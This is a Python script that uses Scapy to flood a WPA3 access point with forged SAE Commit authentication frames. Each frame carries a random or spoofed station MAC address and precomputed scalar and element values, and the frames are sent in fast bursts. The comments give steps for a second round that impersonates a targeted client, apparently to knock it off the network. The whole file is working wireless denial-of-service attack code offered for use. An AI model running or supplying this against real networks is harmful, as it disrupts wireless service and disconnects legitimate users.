#MIT License
#Copyright (c) 2022 Efstratios Chatzoglou
#Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

#This is based on the 1st round, approx. 600 burst frames or 3 min.
#In the 2nd round, put as source MAC address the one of the targeted STA and remove the burst mode.

from scapy.all import *
import random
#Random STA MAC address
def rand_mac():
    return '%02x:%02x:%02x:%02x:%02x:%02x' % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255)
        ) 
#SAE Commit frame
def auth_frame():
    client = rand_mac()
    return RadioTap()\
      /Dot11(type=0, subtype=11, addr1=bssid, addr2=client, addr3=bssid)/Dot11Auth(algo=3, seqnum=1, status=0)
group = '\x13\x00'
def scalar():
    scalar = ['\xad\x8f\xb0\x27\x6b\x51\x82\x58\xc8\x7e\x98\xcc\xb8\x82\xf3\x7d\xaa\x2e\x1d\x2e\x2a\x4f\xbb\x9e\xe9\xab\x13\x81\x0b\xb1\x0c\xff', 
'\xfe\xa0\x7e\xb5\x65\xb4\x00\x57\x88\x22\x6c\x97\x21\x6b\x7c\x34\x7f\xc1\xf0\xfd\x34\xc1\x74\x2b\x6e\xc4\xe2\x91\x98\x11\xc8\xf8', 
'\x08\xce\xf4\x10\x91\xbd\x73\x1c\x13\xbd\x68\x41\xb9\xde\xd4\xaf\x99\x91\x84\xc0\x2d\x46\xbd\x92\x95\x96\x00\xc6\x27\x9c\x06\xca', 
'\x81\xac\xb7\xf8\xbe\x48\x53\x83\xf6\x00\x5b\x15\xe9\x9e\x1b\x8f\x46\xbe\x1c\x6b\xa7\xb1\xcc\x23\x7c\xa5\x8e\x3e\x7f\x39\xf4\x0e', 
'\xf4\x62\x2f\xce\x04\x8f\xb6\x03\xe0\x38\x30\x28\x96\x21\x20\xfc\xb7\xc6\x53\x53\xf8\xb1\xde\xeb\xda\x56\x2c\x4e\xfa\xb7\x86\x80', 
'\xb8\x26\x3a\x4b\x72\xb4\x26\x38\x69\x1b\x47\xd4\x42\x78\x5f\x92\xab\x51\x9b\x3e\xff\x59\x85\x63\xc3\xa3\xe1\x91\x44\x46\x99\x0b',
"\x37\xc2\x53\xef\x46\x33\x28\x54\x28\xd4\x34\x50\xfa\x4b\x14\x15\xf9\x79\xee\x06\x9c\x35\xb5\x39\x48\x50\x11\xd3\xaf\xe4\x46\xc6",
"\x0f\xe0\xe3\xb9\x96\x8d\x62\x3d\xdd\x06\x31\xe9\xe2\xb4\x1f\x0f\x1c\x8c\x18\x2b\xd3\xd4\x39\x06\xcb\x36\xfc\xbb\x79\xd3\x50\xd6",
"\xb1\xf1\x59\x02\x6f\xbf\x04\x02\xf0\x33\xe9\x26\xbd\xcb\x7a\xfa\x9a\x9c\xa9\x90\x16\x21\x8a\x7b\x62\x92\x0e\x4d\x43\x1e\x10\xa3",
"\x92\xb8\xd9\x0a\xe4\x78\xfc\x61\x57\xb3\xae\xba\x1c\x70\xfd\x10\x94\xd3\x24\x47\x5d\xa1\x2c\x87\x05\xed\x4c\x11\xc9\x3e\x1d\xa1",
"\x16\x0f\x6d\xda\x3b\x47\xb6\xc1\xf5\x54\x38\x5f\xe3\x23\xf9\xa2\x2f\xbd\xa9\x0a\x22\x36\xc5\xe8\xfc\xd1\xc6\x81\x42\xa8\x71\x98",
"\x45\xea\x4a\x83\x74\x1a\x07\x3b\x22\x4f\xc4\x0b\xc7\x8c\xd2\x6a\x81\xe6\xd0\x6d\x43\x14\x8b\x35\xd4\xc2\xea\x07\x74\xa3\x44\xa5",
"\xe5\x46\x35\xbf\xe6\x8c\x23\xd1\x5c\xd9\x2c\x77\xb5\xf9\x2a\x64\x6c\x9f\xa5\xac\x06\x4e\x44\x2a\x33\x0a\x74\xb0\x96\x1c\xcc\x24",
"\xdd\xc4\x46\xf5\x9f\x30\x73\xe3\xb5\x2b\xf0\x09\xc0\xc6\x92\x1d\x0b\x46\x30\x32\xf6\x87\x01\xa2\x2e\x15\xb8\x66\x29\xa7\x37\x4b",
"\x38\x40\x75\x93\xac\xc8\x75\xf5\x36\x7f\xae\xf2\x80\xdb\xd9\x12\x99\x14\x87\x4b\x9c\xb7\x57\xc2\x65\x97\x39\x6c\xac\x5b\x6e\x77",
"\x21\x13\xb1\x6a\xd8\xdc\x20\x5e\x99\x29\x49\xe3\x4c\xc4\xa2\x7d\x9f\x06\x00\x4b\x1a\xbd\x88\x7d\x30\x96\x8a\x03\x39\x4d\x1d\x23",
"\x7b\xca\x06\x26\xbe\x4a\xed\xa0\xa4\x91\x58\xe0\x5b\x9a\xde\xdd\xcc\x22\xd8\xe6\x3b\xaf\xce\xbc\x8f\x0c\x5c\x1d\x33\x99\x88\xab",
"\xd9\x57\x91\x44\x79\x04\x1c\x72\xa1\x4d\x38\x99\x1c\x95\x70\xaa\xc6\x15\xba\x97\x60\x37\xcf\x03\xa7\x82\x12\x2f\x37\x68\x04\xc4",
"\xf0\x8e\xd0\xf5\x21\x31\x78\xeb\x13\x2f\x0b\x8e\x99\xfe\xa7\xba\xbb\xbc\x4a\xd6\xcf\x3a\xd6\xed\x6a\x64\x84\x24\x88\xb0\x9d\x50",
"\xc8\x4e\x84\x89\xb9\xbb\x6e\x9b\x89\xfd\xda\x3b\xaf\xdb\x03\xec\xc2\x2f\xbf\xd6\x30\x98\xb9\x17\x3c\x98\xbf\x11\xd5\x25\x7f\xdf"]
    return random.choice(scalar)
def finite():
    finite = ['\xdd\x63\xa2\x52\x8c\x4b\x3a\xe4\x1d\x57\xe3\x6e\x21\xf4\xfb\x1f\xb2\x8a\xca\x8b\x46\x97\x25\x60\x07\x7c\xeb\x02\xd2\x28\xd7\x53\x2f\xc5\xe6\x22\x06\x02\x5a\xc0\x65\x03\x84\xd7\x80\x06\x0d\x87\x30\x67\xa2\xdb\xf1\xb2\x6a\x41\x1d\x97\x73\xee\x82\xcf\xbb\x4b', 
'\xf0\x41\x16\xe1\x62\xbb\x12\x50\xe6\x92\x57\xf9\x9e\x41\x42\xe1\xfc\x6d\x72\x1e\x0f\xcb\xec\x7b\xf6\xe7\x8b\xd8\x82\x0d\x75\x28\x35\xca\x44\x3f\x72\xe6\xba\x79\x2a\x82\x23\x0e\xad\xa8\x92\xaa\x48\x29\x44\x04\xf0\xd8\x87\x38\xe8\x0d\x7d\x59\x0a\x6e\x6b\x52', 
'\x6f\xc8\x11\xe3\xe0\x6f\x27\x61\x8c\x45\xf2\x00\xa4\xbd\xdc\x48\xa0\x74\x33\x36\xb7\xb4\x62\xc1\xa7\x8d\x38\xa7\xbf\xf3\x86\x01\x79\x75\x41\xef\xb6\xe2\xfe\x32\x3b\x84\x6a\x2f\x7c\xb7\x57\x5c\x07\xfa\xf5\xb6\x89\xd1\xc5\x85\x2d\x4f\x4e\x2b\x04\x82\xf4\x0e', 
'\x69\x42\x1d\x7a\xfc\x4a\x65\x22\x20\x40\xd6\x72\x42\x8e\x4b\x70\xeb\x70\xdf\x94\x5b\xa6\x6b\xb4\x69\xa9\x1c\x6c\x2f\x7e\xca\x1b\xb5\x2f\xb8\x49\x73\xd7\x37\x35\x3a\xb4\xcb\x17\x72\xa0\x6a\x34\x1c\x7c\xbc\xbf\x40\xd8\x76\xc2\xd2\x09\x1b\xcb\xa3\x9f\x59\x1e', 
'\x31\x45\xea\x13\x4a\xf7\xf7\xf2\xa6\x18\x67\x2f\xa4\x2e\xf8\x35\x1b\x6a\x90\x51\x68\xb8\x8e\x6b\xfd\x71\xf4\x28\xb3\x15\xb2\x4c\x66\xc3\x65\xf6\x35\x81\x61\x7f\xc7\x8c\xce\x0e\xda\xde\x74\xd1\x19\x28\xc4\x60\xbb\x12\x3d\xc3\x83\xe3\x7e\x47\xd4\xa0\x26\xe9', 
'\x05\xaf\xd3\x99\x6a\x92\x2b\x6e\xde\x4f\x5f\x06\x3e\xcb\xbe\x83\xee\x10\xe9\x77\x8f\x8d\x11\x8b\x6e\xed\x76\xb9\x7b\x8d\x29\xd7\xd4\xd2\x27\x57\x04\xc1\xa2\xff\x01\x82\x34\xde\xef\x54\xe6\x80\x6e\xe0\x83\xb0\x4c\x27\x02\x8d\xce\xbf\x71\xdf\x73\xe7\x92\x96',
"\x05\xaf\xd3\x99\x6a\x92\x2b\x6e\xde\x4f\x5f\x06\x3e\xcb\xbe\x83\xee\x10\xe9\x77\x8f\x8d\x11\x8b\x6e\xed\x76\xb9\x7b\x8d\x29\xd7\xd4\xd2\x27\x57\x04\xc1\xa2\xff\x01\x82\x34\xde\xef\x54\xe6\x80\x6e\xe0\x83\xb0\x4c\x27\x02\x8d\xce\xbf\x71\xdf\x73\xe7\x92\x96",
"\x22\xcf\xf9\x1b\x74\x18\x6e\x5a\x42\x85\x69\x65\xdc\x5c\x08\x9a\xd6\xe8\xec\x81\xeb\x11\x38\x43\x22\x65\xca\x6a\x77\xa3\xcc\x75\xee\xfb\x20\x85\x81\xa3\x76\x1b\xa2\x6c\x96\x47\x71\x3a\xf1\xd6\xce\x57\x8f\x4b\x30\x38\xe9\xba\xb3\x12\xf1\x2b\xa9\xc3\x22\xd2",
"\xe6\x43\x84\xe1\x46\x31\x56\x32\x2a\x1b\x12\x73\x6f\xb0\xe8\x69\x51\xb5\x79\x59\x11\x7c\x0c\x6b\x44\x00\x33\xf6\x99\xf6\x64\xd4\x34\xde\x75\x55\xab\x79\xda\x88\xdf\xc8\x13\xc8\x61\xe9\x18\xa9\x3e\x84\xb3\x53\x9d\x1a\x29\x44\x45\x32\x3a\xf6\xe6\x0b\xfc\x27",
"\x70\x25\xa5\xc5\x65\xec\xce\xb6\x22\x23\xd8\xe0\xb3\x14\xdd\xb6\x23\x5e\xab\xc0\x0e\xc1\x0a\xce\x54\x67\x34\xe2\x0c\x71\xf9\xbe\x9b\xca\xdc\x65\x1e\x6b\x02\xf4\x73\x9f\xea\x8a\x2d\xe0\x70\x44\x2b\xa4\x8b\x99\x5a\x66\xe7\x2c\x50\xe0\x19\x8f\xca\xc2\x53\xbf",
"\x5e\xc4\xae\x77\xfc\x6e\x5a\xd3\x4b\x1c\x7f\x33\xf3\x46\x5e\xc7\x9d\x67\x91\x99\xa8\x7d\x8d\x2e\x8c\xa4\x9a\xf1\xf7\xa0\x43\xd6\xd5\x33\xde\xb4\x69\x5b\xd5\x0e\x68\x51\x76\x7e\x25\xfe\x70\xc7\x1a\xc9\x14\x78\x7f\xf8\x2e\x57\x2f\xcf\xab\x59\xb2\x6a\x81\xce",
"\xee\x2e\xfb\x15\x06\x03\x42\xda\x89\xbe\x99\xcc\x2d\xf6\xda\xb2\x7f\xfd\xd4\xb5\x96\x88\x13\x2f\x0a\x65\x9e\xb5\xb8\xe0\x61\x04\x11\x3b\xcf\xbb\x11\xc7\xf9\x3a\x87\x9f\x41\x80\x81\xff\x27\x1e\x68\x8f\x11\xf1\x30\x6a\x18\xb7\xba\x12\x61\xd5\x29\xfe\x2d\x29",
"\x95\xd6\xe7\xc5\x05\x26\xe4\xe1\xd8\x13\x0a\xc3\xfb\x09\x6c\xbc\xe3\x41\xd7\x3e\x9e\x13\x38\x03\x1a\xc3\x67\x05\xb8\xc2\x18\x54\xe5\xaf\x1d\x83\xcf\x3c\x7e\x7e\x4d\xdd\x51\xce\x3b\xd4\x6c\x23\xb8\x28\x87\x73\x4c\x29\x35\xd7\x6e\x7a\x63\x98\x25\x9c\xcd\x2b",
"\xee\xe7\x31\xbf\x81\xb7\xf7\x41\xfe\xf5\x0a\x3a\x34\xd0\xdb\xe3\xc0\xf6\xca\x58\xee\x6f\x13\x93\x15\xbd\x2a\x5d\x2a\x88\x0c\xd6\x91\x39\x64\xa5\x47\xf7\xa9\x53\x58\x12\xf6\xdf\x35\x30\xc6\xfe\xee\x0a\x0f\x5b\x07\xa1\x7a\xed\x73\xea\x03\xe7\xec\x79\x7f\xc7",
"\x90\xc9\x47\x47\x78\x1c\x80\x7a\x00\x5b\xd9\xa7\xd3\x63\x42\x9c\x1b\x05\xf5\xbb\xd8\x5d\x2d\x1d\xb0\xc5\xed\xe0\xb4\xf6\x7a\x14\x3c\x31\xfb\xa3\x32\x1a\x2a\x3e\x3f\x2c\x36\x4e\xfd\x3a\x41\xb4\xca\xd4\x78\xd0\x35\x16\xb5\xe2\x71\xe5\x00\x78\x4f\x13\xf7\x13",
"\xb5\x67\xce\xfb\x40\x68\x63\x0b\x6c\xb3\xca\x20\x7e\xf3\x6f\xd3\x2f\x7f\x34\xae\x91\xd5\x35\x25\x03\x72\x40\xe0\x90\x2c\x44\x88\x68\x5f\xda\x48\xd2\xc3\xfe\x2e\x1f\xad\xd5\x54\xba\x42\xc0\xed\x5d\xf0\x33\x14\xa1\xda\xc7\xb4\xee\x91\xcd\x24\xcb\xfa\xcd\xe7",
"\xfe\xcf\x1f\x4a\x54\x6d\x4c\x31\x5f\x16\xd8\xc7\xc7\xef\xc9\x7e\xb4\x9f\x82\x8f\x53\x5b\x15\x85\x18\xff\xf9\xcc\x2f\x56\x67\x06\xae\x12\x41\x12\x92\xb8\xf4\x27\x88\x6e\xbc\xc8\xed\x7e\x7f\xac\xf9\xdd\xf8\xea\xf7\xd9\x81\x30\x49\xe9\x40\xe6\x94\xe2\x9d\x4c",
"\xa4\x81\x13\xbc\x4f\x4d\x23\xb5\x93\xac\x33\x01\x13\xd5\x0f\x48\xee\xd9\xc4\xe9\x0c\x85\xaa\x6d\xc7\xb7\x9d\x07\x33\x4d\xb3\x30\x75\x0f\xfa\x20\xc7\x7b\x53\xf6\xa0\x39\x11\xff\x85\x4f\x9d\x5b\x2a\x5a\x5b\xf9\x1f\xff\x1f\x13\xdd\x38\x14\x9a\x54\xb2\xc2\x52",
"\xa6\xeb\x5f\xba\x76\xa0\x85\xa4\x87\xf4\xc0\xd4\x05\x86\x5f\x80\xe7\xd9\x6d\x81\x0f\x59\x44\x41\x5e\xf0\xb7\x9c\xf3\x6b\x45\x99\x0f\xbc\x36\x02\x52\xa7\xa5\x4c\xa2\x44\xc9\x51\xb1\x64\x5e\x72\xab\x94\x1f\x13\x41\xa2\xa8\x38\x21\xbf\x29\xe5\x1f\x58\xa4\x19",
"\x19\xd3\x4b\x85\x03\x1f\x69\x37\xed\x7d\xad\x0c\x93\xbc\x43\x55\xe8\xec\x68\x1e\xc6\x51\x85\x0b\x0c\x31\xc9\x77\x7f\xc5\x7a\xe7\x34\x2d\x04\x12\x9c\xa1\x53\x7d\x1f\x28\x33\x13\xb1\xf3\x6c\x76\xa3\x8d\x9b\xe9\x6e\x44\x9a\xce\xdf\xb9\x14\x60\xc0\x64\x68\x67"]

    return random.choice(finite)
def construct_commit():
    Auth = auth_frame()
    Scalar = scalar()
    Finite = finite()
    return Auth/group/Scalar/Finite
for n in range(int(count)):
	sendp(construct_commit(), inter=0.0001, count = 128, iface='wlan0')
	print ('\nSAE Commit frame send: ' + str(n))
